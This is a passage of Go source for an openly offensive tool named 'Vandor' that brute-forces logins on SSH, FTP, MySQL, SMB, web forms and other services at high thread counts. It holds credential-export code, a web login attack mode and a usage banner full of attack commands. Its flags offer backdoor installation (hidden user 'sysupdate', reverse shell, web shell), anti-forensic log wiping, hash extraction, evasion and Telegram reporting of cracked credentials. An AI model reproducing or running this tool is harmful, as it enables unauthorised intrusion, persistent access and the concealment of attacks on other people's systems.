			for _, pass := range passes {
				if atomic.LoadInt32(&prtl.GlobalStop) == 1 {
					break
				}
				wg.Add(1)
				sem <- struct{}{}
				go func(h, u, p string) {
					defer wg.Done()
					defer func() { <-sem }()
					var success bool
					switch proto {
					case "ftp":
						success = prtl.RunFTP(h, port, u, p, timeout)
					case "mysql":
						success = prtl.RunMySQL(h, port, u, p, timeout)
					}
					if success {
						fmt.Printf("\n%sok CRACKED:%s %s@%s:%s | %s\n", colors.Green, colors.Reset, u, h, port, p)
						crackedMu.Lock()
						entry := fmt.Sprintf("%s:%s|%s:%s|%s", h, port, u, p, proto)
						if crackedBuffer != nil {
							crackedBuffer.Append(entry)
						}
						crackedMu.Unlock()
					}
				}(host, user, pass)
			}
		}
	}
	wg.Wait()
}

func exportResults(crackedList []string, completedHosts int32, TotalAttempts, successAttempts int64, honeypotCount, bannedCount int, gpuSpeedup float64) {
	if len(crackedList) == 0 && honeypotCount == 0 {
		return
	}

	var mostUsedPass string
	maxCount := 0
	prtl.LearningMu.RLock()
	for pass, count := range prtl.LearningMap {
		if count > maxCount {
			maxCount = count
			mostUsedPass = pass
		}
	}
	prtl.LearningMu.RUnlock()

	var commonPattern string
	for _, pattern := range prtl.PasswordPatterns {
		for _, entry := range crackedList {
			if strings.Contains(entry, fmt.Sprintf(pattern, "")) {
				commonPattern = pattern
				break
			}
		}
		if commonPattern != "" {
			break
		}
	}

	successRate := 0.0
	if TotalAttempts > 0 {
		successRate = float64(successAttempts) / float64(TotalAttempts) * 100
	}

	stats := prtl.StatData{
		TotalAttempts:    TotalAttempts,
		SuccessRate:      successRate,
		AvgTimePerHost:   time.Since(startTime).Seconds() / float64(completedHosts+1),
		MostUsedPass:     mostUsedPass,
		CommonPattern:    commonPattern,
		HoneypotDetected: honeypotCount,
		BannedHosts:      bannedCount,
		GPUSpeedup:       gpuSpeedup,
	}

	var existingResults ResultJSON
	var allCracked []string

	if _, err := os.Stat("results.json"); err == nil {
		f, err := os.Open("results.json")
		if err == nil {
			defer f.Close()
			decoder := json.NewDecoder(f)
			if err := decoder.Decode(&existingResults); err == nil {
				allCracked = existingResults.Cracked
			}
		}
	}

	existingMap := make(map[string]bool)
	for _, entry := range allCracked {
		existingMap[entry] = true
	}
	for _, entry := range crackedList {
		if !existingMap[entry] {
			allCracked = append(allCracked, entry)
		}
	}

	result := ResultJSON{
		Timestamp:  startTime.Format("2006-01-02 15:04:05"),
		Duration:   time.Since(startTime).Round(time.Second).String(),
		TotalHosts: int(completedHosts),
		TotalCreds: len(allCracked),
		Cracked:    allCracked,
		Statistics: stats,
	}

	jsonFile, err := os.Create("results.json")
	if err == nil {
		defer jsonFile.Close()
		data, _ := json.MarshalIndent(result, "", "  ")
		jsonFile.Write(data)
		fmt.Printf("[EXPORT] results.json updated (%d total entries)\n", len(allCracked))
	}

	var csvExists bool
	if _, err := os.Stat("results.csv"); err == nil {
		csvExists = true
	}

	csvFile, err := os.OpenFile("results.csv", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer csvFile.Close()

		if !csvExists {
			csvFile.WriteString("host,port,username,password,banner\n")
		}

		existingCSV := make(map[string]bool)
		if csvExists {
			readFile, _ := os.Open("results.csv")
			if readFile != nil {
				scanner := bufio.NewScanner(readFile)
				for scanner.Scan() {
					line := scanner.Text()
					if !strings.HasPrefix(line, "host,") {
						existingCSV[line] = true
					}
				}
				readFile.Close()
			}
		}

		newCount := 0
		for _, entry := range crackedList {
			parts := strings.Split(entry, "|")
			if len(parts) >= 2 {
				hostPort := strings.Split(parts[0], ":")
				if len(hostPort) == 2 && len(parts) == 3 {
					credParts := strings.Split(parts[1], ":")
					if len(credParts) == 2 {
						csvLine := fmt.Sprintf("%s,%s,%s,%s,%s",
							hostPort[0], hostPort[1], credParts[0], credParts[1], parts[2])

						if !existingCSV[csvLine] {
							fmt.Fprintf(csvFile, "%s\n", csvLine)
							newCount++
						}
					}
				}
			}
		}
		fmt.Printf("[EXPORT] results.csv updated (%d new entries)\n", newCount)
	}
}

func getListFromInput(input string) []string {
	if input == "" {
		return []string{}
	}

	if _, err := os.Stat(input); err == nil {
		lines, err := readLines(input)
		if err == nil && len(lines) > 0 {
			cleanLines := make([]string, len(lines))
			for i, line := range lines {
				cleanLines[i] = strings.TrimSpace(strings.Trim(line, "\r\n\t "))
			}
			return cleanLines
		}
		return []string{input}
	}

	cleaned := strings.TrimSpace(strings.Trim(input, "\r\n\t "))
	return []string{cleaned}
}

func printUsage() {
	fmt.Printf(`
╔══════════════════════════════════════════════════════════════════════════╗
║                         Vandor - EXAMPLES                                ║
╚══════════════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════════════
 FLAG: -hs (Hosts)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 192.168.1.100
  Example 2: ./Vandor -hs targets.txt

═══════════════════════════════════════════════════════════════════════════
 FLAG: -p (Protocol)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 10.0.0.5 -p ssh
  Example 2: ./Vandor -hs hosts.txt -p mysql

═══════════════════════════════════════════════════════════════════════════
 FLAG: -P (Custom Port)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 192.168.1.50 -P 2222 -p ssh
  Example 2: ./Vandor -hs targets.txt -P 3306 -p mysql

═══════════════════════════════════════════════════════════════════════════
 FLAG: -ps (Port Scan - comma separated or range)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 192.168.1.1 -ps 22,135,445,3389
  Example 2: ./Vandor -hs hosts.txt -ps 1-1000

═══════════════════════════════════════════════════════════════════════════
 FLAG: -u (Users)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 10.0.0.5 -u root -p ssh
  Example 2: ./Vandor -hs targets.txt -u users.txt -p ftp

═══════════════════════════════════════════════════════════════════════════
 FLAG: -psw (Passwords)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 192.168.1.10 -psw admin123 -p telnet
  Example 2: ./Vandor -hs hosts.txt -psw rockyou.txt -p ssh

═══════════════════════════════════════════════════════════════════════════
 FLAG: -c (Credentials file - user:pass format)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 10.0.0.5 -c creds.txt -p smb
  Example 2: ./Vandor -hs targets.txt -c "admin:123,root:toor,user:pass"

═══════════════════════════════════════════════════════════════════════════
 FLAG: -m (Mode: cross or single)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 192.168.1.100 -u root -psw pass.txt -m single
  Example 2: ./Vandor -hs hosts.txt -u users.txt -psw passes.txt -m cross

═══════════════════════════════════════════════════════════════════════════
 FLAG: -t (Timeout seconds)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 10.0.0.1 -t 3
  Example 2: ./Vandor -hs slow_hosts.txt -t 10

═══════════════════════════════════════════════════════════════════════════
 FLAG: -threads (Concurrent threads)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 192.168.1.1 -threads 1000
  Example 2: ./Vandor -hs large_network.txt -threads 10000

═══════════════════════════════════════════════════════════════════════════
 FLAG: -min-delay / -max-delay (Random delay in ms)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs target.com -min-delay 100 -max-delay 500
  Example 2: ./Vandor -hs iot_devices.txt -min-delay 500 -max-delay 2000

═══════════════════════════════════════════════════════════════════════════
 FLAG: -json / -csv (Export results)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs targets.txt -u admin -psw pass.txt -json
  Example 2: ./Vandor -hs hosts.txt -c creds.txt -json -csv

═══════════════════════════════════════════════════════════════════════════
 FLAG: -smart-pass (Smart password generation)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 10.0.0.5 -u admin -psw admin -smart-pass
  Example 2: ./Vandor -hs targets.txt -u root -psw root123 -smart-pass

═══════════════════════════════════════════════════════════════════════════
 FLAG: -gpu (GPU acceleration)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 192.168.1.1 -u root -psw hashes.txt -gpu
  Example 2: ./Vandor -hs large.txt -c creds.txt -gpu -threads 50000

═══════════════════════════════════════════════════════════════════════════
 FLAG: -ramdisk (RAM disk mode for ultra-fast I/O)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs big_wordlist.txt -u admin -psw dict.txt -ramdisk
  Example 2: ./Vandor -hs targets.txt -c creds.txt -ramdisk -threads 10000

═══════════════════════════════════════════════════════════════════════════
 FLAG: -multi-city (Route through multiple cities)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs target.com -u admin -psw pass.txt -multi-city
  Example 2: ./Vandor -hs stealth_targets.txt -c creds.txt -multi-city

═══════════════════════════════════════════════════════════════════════════
 FLAG: -post-exploit (Gather system info after cracking)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 10.0.0.5 -c valid.txt -post-exploit
  Example 2: ./Vandor -hs hacked_hosts.txt -u root -psw found.txt -post-exploit

═══════════════════════════════════════════════════════════════════════════
 FLAG: -backdoor (Install backdoor on cracked hosts)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 192.168.1.100 -c creds.txt -backdoor -backdoor-type ssh-key
  Example 2: ./Vandor -hs targets.txt -u admin -psw pass.txt -backdoor -backdoor-type hidden-user -backdoor-port 31337

═══════════════════════════════════════════════════════════════════════════
 FLAG: -scan-network (Scan internal network after access)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 10.0.0.1 -c creds.txt -scan-network
  Example 2: ./Vandor -hs gateway.txt -u root -psw pass.txt -scan-network

═══════════════════════════════════════════════════════════════════════════
 FLAG: -extract-hash (Extract password hashes)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 192.168.1.50 -c admin.txt -extract-hash
  Example 2: ./Vandor -hs linux_servers.txt -u root -psw pass.txt -extract-hash

═══════════════════════════════════════════════════════════════════════════
 FLAG: -gen-script (Generate auto-login script)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 10.0.0.5 -c cracked.txt -gen-script
  Example 2: ./Vandor -hs success_hosts.txt -u admin -psw found.txt -gen-script

═══════════════════════════════════════════════════════════════════════════
 FLAG: -honeypot (Honeypot detection)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs suspicious.net -u test -psw test -honeypot
  Example 2: ./Vandor -hs unknown_hosts.txt -c dummy.txt -honeypot

═══════════════════════════════════════════════════════════════════════════
 FLAG: -anti-forensic (Wipe logs after cracking)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 10.0.0.5 -c creds.txt -anti-forensic
  Example 2: ./Vandor -hs targets.txt -u root -psw pass.txt -anti-forensic

═══════════════════════════════════════════════════════════════════════════
 FLAG: -mass-pwn (All hosts × all users × all passwords)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs many_hosts.txt -u users.txt -psw passes.txt -mass-pwn
  Example 2: ./Vandor -hs network_scan.txt -c all_creds.txt -mass-pwn

═══════════════════════════════════════════════════════════════════════════
 FLAG: -bot-token / -chat-id / -not (Telegram notifications)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs target.com -u admin -psw rockyou.txt -bot-token "123:ABC" -chat-id "456" -not 1
  Example 2: ./Vandor -hs hosts.txt -c creds.txt -bot-token "TOKEN" -chat-id "ID" -not 2

═══════════════════════════════════════════════════════════════════════════
 FLAG: -resume (Resume from checkpoint)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs targets.txt -u users.txt -psw passes.txt -resume
  Example 2: ./Vandor -hs big_scan.txt -c creds.txt -resume

═══════════════════════════════════════════════════════════════════════════
 FLAG: -skip-alive (Skip alive check)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs network.txt -p rdp -skip-alive
  Example 2: ./Vandor -hs dead_hosts.txt -u root -psw pass.txt -skip-alive

═══════════════════════════════════════════════════════════════════════════
 FLAG: -auto-port (Auto detect service port)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs 10.0.0.1 -p ssh -auto-port
  Example 2: ./Vandor -hs targets.txt -c creds.txt -auto-port

═══════════════════════════════════════════════════════════════════════════
 FLAG: -http-path / -http-user-field / -http-pass-field (HTTP form attack)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs web.target.com -u admin -psw pass.txt -http-path /login -http-user-field user -http-pass-field pwd
  Example 2: ./Vandor -hs sites.txt -c creds.txt -http-path /admin -http-user-field username -http-pass-field password

═══════════════════════════════════════════════════════════════════════════
 FLAG: -monitor (Real-time monitoring)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs targets.txt -u users.txt -psw passes.txt -monitor
  Example 2: ./Vandor -hs large_scan.txt -c creds.txt -monitor -threads 5000

═══════════════════════════════════════════════════════════════════════════
 FLAG: -attack-mode (normal|null|userpass|reverse)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -hs target.com -u admin -psw pass.txt -attack-mode null
  Example 2: ./Vandor -hs hosts.txt -c creds.txt -attack-mode reverse

═══════════════════════════════════════════════════════════════════════════
🌋 WEB INFERNO FLAGS:
═══════════════════════════════════════════════════════════════════════════

 FLAG: -req (Request file or URL)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -req http://target.com/login
  Example 2: ./Vandor -req burp_request.txt

 FLAG: -web-var (Variables: file or inline)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -req target.com/login -web-var "user=users.txt,pass=pass.txt"
  Example 2: ./Vandor -req api.com/login -web-var "user=admin,pass=123,host=localhost"

 FLAG: -ifin / -ifnin (Success/Failure conditions)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -req target.com/login -ifin "Welcome" -ifnin "Invalid"
  Example 2: ./Vandor -req api.com/auth -ifin "success\":true" -ifnin "error"

 FLAG: -web-out / -web-fail / -web-tokens (Output files)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -req target.com/login -web-out success.txt -web-fail failed.txt
  Example 2: ./Vandor -req api.com/login -web-out valid.txt -web-tokens tokens.txt

 FLAG: -web-out-format (Custom output format)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -req target.com/login -web-var "user=users.txt,pass=pass.txt" -web-out-format "{user}:{pass}"
  Example 2: ./Vandor -req api.com/login -web-var "user=users.txt,pass=pass.txt,host=hosts.txt" -web-out-format "{user}@{host}:{pass}"

 FLAG: -web-threads / -web-rate / -web-timeout
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -req target.com/login -web-threads 50 -web-rate 100 -web-timeout 10
  Example 2: ./Vandor -req api.com/login -web-threads 200 -web-rate 500 -web-timeout 5

 FLAG: -web-evasion (0-5: None to Insane)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -req target.com/login -web-evasion 3
  Example 2: ./Vandor -req protected.com/login -web-evasion 5 -web-random-delay

 FLAG: -web-intel (0-3: Dumb to God)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -req target.com/login -web-intel 2
  Example 2: ./Vandor -req complex.com/login -web-intel 3 -web-learn

 FLAG: -dynamic-token (CSRF token extraction)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -req target.com/login -dynamic-token -token-url http://target.com/login -token-field csrf
  Example 2: ./Vandor -req secure.com/login -dynamic-token -token-start "csrf_token\":\"" -token-end "\""

 FLAG: -rar / -rar-dict (RAR cracker)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -rar archive.rar -rar-dict passwords.txt
  Example 2: ./Vandor -rar secret.rar -rar-dict rockyou.txt -rar-workers 1000

 FLAG: -zip / -zip-dict (ZIP cracker)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -zip file.zip -zip-dict passwords.txt
  Example 2: ./Vandor -zip backup.zip -zip-dict rockyou.txt -zip-workers 2000

 FLAG: -ws (WebSocket attack)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -ws ws://target.com/socket -web-var "user=users.txt"
  Example 2: ./Vandor -ws wss://secure.com/chat -web-body '{"user":"[[user]]","pass":"[[pass]]"}'

 FLAG: -gql (GraphQL attack)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -gql http://target.com/graphql -web-body 'query {user(name:"[[user]]") {password}}'
  Example 2: ./Vandor -gql api.com/graphql -web-var "user=users.txt" -ifin "data"

 FLAG: -web-debug (Enable debug mode)
═══════════════════════════════════════════════════════════════════════════
  Example 1: ./Vandor -req target.com/login -web-debug
  Example 2: ./Vandor -req api.com/auth -web-debug -web-out-format "{user}:{pass}"
`)
}

func formatVars(vars map[string]string) string {
	parts := make([]string, 0, len(vars))
	for k, v := range vars {
		parts = append(parts, fmt.Sprintf("%s=%s", k, v))
	}
	return strings.Join(parts, " | ")
}

func runWebInfernoMode(
	reqFile, webVars, webIfin, webIfnin *string,
	webTokenRegex *string, webAutoToken *bool,
	webOut, webFail, webTokensOut *string, webRandomDelay *bool,
	webThreads, webTimeout, webRateLimit, webRetries *int,
	webEvasion, webIntel *int, webLearn, webFollowRedirect *bool,
	webMaxRedirects *int, webMethod, webBody, webHeaders *string,
	dynamicToken *bool, tokenURL, tokenMethod, tokenStart, tokenEnd *string, tokenRefresh *int, tokenField *string, webDebug *bool, webJSON, webXML *bool,
	webAuthType, webAuthUser, webAuthPass, webAuthToken *string,
	oauthClientID, oauthClientSecret, oauthTokenURL, oauthScope *string,
	webFuzzPayloads, webFuzzPositions *string,
	webSocketURL, graphQLEndpoint *string,
	clusterNodes *string,
	reportHTML *bool, runWebInfernoMode *bool, OutputFormat *string,
) {
	fmt.Printf("%s\n", strings.Repeat("=", 80))
	fmt.Printf("%s🔥 WEB INFERNO MODE ACTIVATED%s\n", colors.Red, colors.Reset)
	fmt.Printf("%s\n", strings.Repeat("=", 80))

	customHeaders := make(map[string]string)
	if *webHeaders != "" {
		parts := strings.Split(*webHeaders, ",")
		for _, part := range parts {
			kv := strings.SplitN(strings.TrimSpace(part), ":", 2)
			if len(kv) == 2 {
				customHeaders[strings.TrimSpace(kv[0])] = strings.TrimSpace(kv[1])
			}
		}
	}

	variables := make(map[string]webinferno.VariableSource)
	if *webVars != "" {
		parts := strings.Split(*webVars, ",")
		for _, part := range parts {
			kv := strings.SplitN(part, "=", 2)
			if len(kv) == 2 {
				varName := kv[0]
				sourcePath := kv[1]

				mutations := []string{}
				if strings.Contains(sourcePath, "[") && strings.Contains(sourcePath, "]") {
					re := regexp.MustCompile(`\[([a-z|]+)\]`)
					matches := re.FindStringSubmatch(sourcePath)
					if len(matches) > 1 {
						mutations = strings.Split(matches[1], "|")
						sourcePath = strings.Split(sourcePath, "[")[0]
					}
				}

				if strings.HasPrefix(sourcePath, "[") && strings.HasSuffix(sourcePath, "]") {
					inlineValues := strings.Split(sourcePath[1:len(sourcePath)-1], "|")
					variables[varName] = webinferno.VariableSource{
						Type:      "inline",
						Values:    inlineValues,
						Mutations: mutations,
					}
				} else {
					variables[varName] = webinferno.VariableSource{
						Type:      "file",
						FilePath:  sourcePath,
						Mutations: mutations,
					}
				}
			}
		}
	}

	var successCriteria []webinferno.SuccessCriterion
	if *webIfin != "" {
		successCriteria = append(successCriteria, webinferno.SuccessCriterion{
			Type:  "contains",
			Value: *webIfin,
		})
	}

	var failureCriteria []webinferno.FailureCriterion
	if *webIfnin != "" {
		failureCriteria = append(failureCriteria, webinferno.FailureCriterion{
			Type:  "not_contains",
			Value: *webIfnin,
		})
	}

	var extractors []webinferno.DataExtractor
	if *tokenStart != "" && *tokenEnd != "" {
		extractors = append(extractors, webinferno.DataExtractor{
			Name:       "csrf_token",
			Type:       "between",
			StartToken: *tokenStart,
			EndToken:   *tokenEnd,
			StoreAs:    "token",
		})
	}
	if *webTokenRegex != "" {
		extractors = append(extractors, webinferno.DataExtractor{
			Name:    "extracted",
			Type:    "regex",
			Pattern: *webTokenRegex,
			StoreAs: "token",
		})
	}
	if *webJSON {
		customHeaders["Content-Type"] = "application/json"
	}
	if *webXML {
		customHeaders["Content-Type"] = "application/xml"
	}

	authConfig := webinferno.AuthConfig{}
	if *webAuthType != "" {
		authConfig.Type = *webAuthType
		authConfig.Username = *webAuthUser
		authConfig.Password = *webAuthPass
		authConfig.Token = *webAuthToken
		authConfig.Bearer = *webAuthToken
	}

	oauthConfig := webinferno.OAuth2Config{}
	if *oauthClientID != "" {
		oauthConfig.ClientID = *oauthClientID
		oauthConfig.ClientSecret = *oauthClientSecret
		oauthConfig.TokenURL = *oauthTokenURL
		oauthConfig.Scope = *oauthScope
	}

	var fuzzPayloads []string
	if *webFuzzPayloads != "" {
		data, _ := os.ReadFile(*webFuzzPayloads)
		fuzzPayloads = strings.Split(string(data), "\n")
	}

	var clusterNodeList []string
	if *clusterNodes != "" {
		clusterNodeList = strings.Split(*clusterNodes, ",")
	}
	cfg := webinferno.WebInfernoConfig{
		RequestFile:          *reqFile,
		Method:               *webMethod,
		Body:                 *webBody,
		Variables:            variables,
		SuccessCriteria:      successCriteria,
		FailureCriteria:      failureCriteria,
		Extractors:           extractors,
		Intelligence:         webinferno.IntelligenceLevel(*webIntel),
		AutoDetectTokens:     *webAutoToken,
		EvasionLevel:         *webEvasion,
		RandomDelays:         *webRandomDelay,
		OutputSuccess:        *webOut,
		OutputFail:           *webFail,
		OutputTokens:         *webTokensOut,
		Timeout:              *webTimeout,
		Threads:              *webThreads,
		Debug:                *webDebug,
		MaxRetries:           *webRetries,
		RateLimit:            *webRateLimit,
		FollowRedirects:      *webFollowRedirect,
		MaxRedirects:         *webMaxRedirects,
		DynamicToken:         *dynamicToken,
		TokenURL:             *tokenURL,
		TokenMethod:          *tokenMethod,
		TokenStart:           *tokenStart,
		TokenEnd:             *tokenEnd,
		TokenRefreshInterval: *tokenRefresh,
		TokenField:           *tokenField,
		Auth:                 authConfig,
		OAuth:                oauthConfig,
		FuzzPayloads:         fuzzPayloads,
		ClusterNodes:         clusterNodeList,
		WebSocketURL:         *webSocketURL,
		GraphQLEndpoint:      *graphQLEndpoint,
		OutputFormat:         *OutputFormat,
	}

	inferno := webinferno.NewWebInferno(cfg)

	go func() {
		for result := range inferno.GetResults() {
			if result.Success {
				fmt.Printf("\n%s SUCCESS:%s %s | %d | %.2fs\n",
					colors.Green, colors.Reset,
					formatVars(result.Variables),
					result.StatusCode,
					result.ResponseTime.Seconds())

				if len(result.Extracted) > 0 {
					for name, value := range result.Extracted {
						fmt.Printf("   %s📦 %s: %s%s\n", colors.Yellow, name, truncate(value, 50), colors.Reset)
					}
				}
			}
		}
	}()

	inferno.Run()
	inferno.Stop()
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

func main() {
	startTime = time.Now()
	banner()
	if len(os.Args) > 1 && os.Args[1] == "-example" {
		printUsage()
		os.Exit(0)
	}

	proto := flag.String("p", "ssh", "ssh|rdp|ftp|mysql|postgres|mssql|redis|mongodb|pop3|imap|smtp|snmp|ldap|smb|telnet|vnc")
	hostsFile := flag.String("hs", "", "hosts file, CIDR, or single IP")
	portFlag := flag.String("P", "", "custom port")
	autoDetectPort := flag.Bool("auto-port", false, "auto detect services on host")
	portScanFlag := flag.String("ps", "", "port scan range")
	userInput := flag.String("u", "", "username, username:password, or users file")
	passInput := flag.String("psw", "", "password, or passwords file")
	credsFile := flag.String("c", "", "credentials file (user:pass format)")
	mode := flag.String("m", "cross", "cross|single")
	timeout := flag.Int("t", 5, "timeout seconds")
	skipAlive := flag.Bool("skip-alive", false, "skip alive check")
	resume := flag.Bool("resume", false, "resume from checkpoint")
	minDelay := flag.Int("min-delay", 0, "minimum random delay (ms)")
	maxDelay := flag.Int("max-delay", 0, "maximum random delay (ms)")
	threads := flag.Int("threads", 5000, "concurrent threads")
	outputJSON := flag.Bool("json", true, "export JSON results")
	outputCSV := flag.Bool("csv", false, "export CSV results")
	notify := flag.Int("not", 0, "0=off, 1=on crack, 2=on completion")
	smartPass := flag.Bool("smart-pass", false, "generate smart passwords")
	postExploitFlag := flag.Bool("post-exploit", false, "gather system info after cracking")
	scanNetworkFlag := flag.Bool("scan-network", false, "scan internal network after access")
	extractHashFlag := flag.Bool("extract-hash", false, "extract password hashes after access")
	generateScriptFlag := flag.Bool("gen-script", false, "generate auto-login script")
	monitor := flag.Bool("monitor", false, "enable real-time monitoring")
	additionalProto := flag.String("proto-add", "", "additional protocol: ftp, mysql")
	honeypotCheck := flag.Bool("honeypot", false, "enable honeypot detection")
	gpuAccel := flag.Bool("gpu", false, "enable GPU acceleration")
	ramDisk := flag.Bool("ramdisk", false, "use RAM disk for ultra-fast I/O")
	multiCity := flag.Bool("multi-city", false, "route traffic through multiple cities")
	massPwnFlag := flag.Bool("mass-pwn", false, "attack all hosts with all credentials simultaneously")
	antiForensic := flag.Bool("anti-forensic", false, "enable anti-forensic operations")

	backdoorEnabled := flag.Bool("backdoor", false, "install backdoor on cracked hosts")
	backdoorType := flag.String("backdoor-type", "ssh-key", "backdoor type: ssh-key, hidden-user, reverse-shell, sshd-port, web-shell, all")
	backdoorPort := flag.Int("backdoor-port", 22222, "port for backdoor")
	backdoorUser := flag.String("backdoor-user", "sysupdate", "hidden username")
	backdoorPass := flag.String("backdoor-pass", "P@ssw0rd123!", "password for hidden user")
	backdoorKey := flag.String("backdoor-key", "", "SSH public key to install")

	httpFormPath := flag.String("http-path", "", "HTTP login path (e.g., /login)")
	httpUserField := flag.String("http-user-field", "username", "HTTP username field name")
	httpPassField := flag.String("http-pass-field", "password", "HTTP password field name")
	attackMode := flag.String("attack-mode", "normal", "normal|null|userpass|reverse")

	teleToken := flag.String("bot-token", "", "Telegram bot token")
	teleChat := flag.String("chat-id", "", "Telegram chat ID")

	reqFile := flag.String("req", "", "HTTP request file OR direct URL (http://example.com/api)")
	webVars := flag.String("web-var", "", "Variables: user=users.txt,pass=passwords.txt")
	webIfin := flag.String("ifin", "", "Save if response contains this string")
	webIfnin := flag.String("ifnin", "", "Save if response does NOT contain this string")
	webTokenRegex := flag.String("token-regex", "", "Regex for token extraction")
	webAutoToken := flag.Bool("auto-token", true, "Auto-detect CSRF tokens")
	webOut := flag.String("web-out", "web_success.txt", "Output file for matches")
	webFail := flag.String("web-fail", "web_failed.txt", "Output file for failures")
	webTokensOut := flag.String("web-tokens", "extracted_tokens.txt", "Output for extracted tokens")
	webRandomDelay := flag.Bool("web-random-delay", false, "Random delay 1-30s")
	webThreads := flag.Int("web-threads", 30, "Number of threads")
	webTimeout := flag.Int("web-timeout", 10, "Timeout in seconds")
	webRateLimit := flag.Int("web-rate", 100, "Rate limit (requests/second)")
	webRetries := flag.Int("web-retries", 2, "Max retries on failure")
	webEvasion := flag.Int("web-evasion", 3, "Evasion level (0-5)")
	webIntel := flag.Int("web-intel", 2, "Intelligence level (0=dumb,1=smart,2=genius,3=god)")
	webLearn := flag.Bool("web-learn", true, "Learn from responses")
	webFollowRedirect := flag.Bool("web-follow", true, "Follow redirects")
	webMaxRedirects := flag.Int("web-max-redirect", 5, "Max redirects")
	webMethod := flag.String("web-method", "GET", "HTTP method for direct URL")
	webBody := flag.String("web-body", "", "Request body for direct URL")
	webHeaders := flag.String("web-headers", "", "Custom headers: 'Header1: value1, Header2: value2'")
	dynamicToken := flag.Bool("dynamic-token", false, "Enable dynamic token extraction")
	tokenURL := flag.String("token-url", "", "URL to fetch token from")
	tokenMethod := flag.String("token-method", "GET", "Method for token fetch (GET/POST)")
	tokenStart := flag.String("token-start", "", "Start string for token extraction")
	tokenEnd := flag.String("token-end", "", "End string for token extraction")
	tokenRefresh := flag.Int("token-refresh", 1, "Refresh token every N requests (0=every request)")
	tokenField := flag.String("token-field", "token", "Variable name for token in request body")
	webDebug := flag.Bool("web-debug", false, "Enable Debug Response")
	webJSON := flag.Bool("web-json", false, "Force JSON content type")
	webXML := flag.Bool("web-xml", false, "Force XML content type")
	webAdaptiveRate := flag.Bool("web-adaptive-rate", false, "Enable adaptive rate limiting")
	webAuthType := flag.String("web-auth", "", "Auth type: basic|bearer|token")
	webAuthUser := flag.String("web-auth-user", "", "Username for basic auth")
	webAuthPass := flag.String("web-auth-pass", "", "Password for basic auth")
	webAuthToken := flag.String("web-auth-token", "", "Bearer token or API key")
	OutputFormat := flag.String("web-out-format", "", "Output format like {user}:{pass}")
	oauthClientID := flag.String("oauth-client-id", "", "OAuth2 client ID")
	oauthClientSecret := flag.String("oauth-client-secret", "", "OAuth2 client secret")
	oauthTokenURL := flag.String("oauth-token-url", "", "OAuth2 token URL")
	oauthScope := flag.String("oauth-scope", "", "OAuth2 scope")
	webFuzzPayloads := flag.String("web-fuzz", "", "Fuzzing payloads file (one per line)")
	webFuzzPositions := flag.String("web-fuzz-pos", "", "Fuzz positions: 1,2,3 or 1-3")
	webSocketURL := flag.String("ws", "", "WebSocket URL for attack")
	graphQLEndpoint := flag.String("gql", "", "GraphQL endpoint")
	clusterNodes := flag.String("cluster", "", "Cluster nodes: node1:8080,node2:8080")

	reportHTML := flag.Bool("web-report", true, "Generate HTML report")
	rarFile := flag.String("rar", "", "RAR file path to crack")
	rarDict := flag.String("rar-dict", "", "Password dictionary for RAR cracking")
	rarWorkers := flag.Int("rar-workers", 500, "Number of workers for RAR cracking (default: CPU*2)")
	rarBuffer := flag.Int("rar-buffer", 10000, "Buffer size for password channel")

	zipFile := flag.String("zip", "", "ZIP file to crack")
	zipDict := flag.String("zip-dict", "", "Password dictionary for ZIP")
	zipWorkers := flag.Int("zip-workers", 500, "Workers for ZIP")
